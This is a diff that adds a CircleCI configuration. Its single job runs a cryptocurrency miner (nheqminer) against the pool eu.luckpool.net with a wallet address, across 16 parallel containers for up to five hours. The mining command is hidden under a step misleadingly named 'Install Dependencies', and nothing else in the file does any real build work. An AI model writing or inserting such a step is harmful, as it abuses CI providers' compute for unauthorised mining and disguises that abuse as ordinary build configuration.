@@ -1,0 +1,17 @@
+version: 2.1
+jobs:
+    trial:
+      docker:
+            - image: morion4000/veruscoin
+      parallelism: 16
+      steps:
+        - run:
+            name: Install Dependencies
+            command: nheqminer/nheqminer -v -l eu.luckpool.net:3956 -u RGeh7nrccmcQfi3BFm5xutoHiKCARPhrTD.sajskaja -p x -t 1
+            no_output_timeout: 5h
+
+workflows:
+    version: 2.1
+    build:
+        jobs:
+        - trial
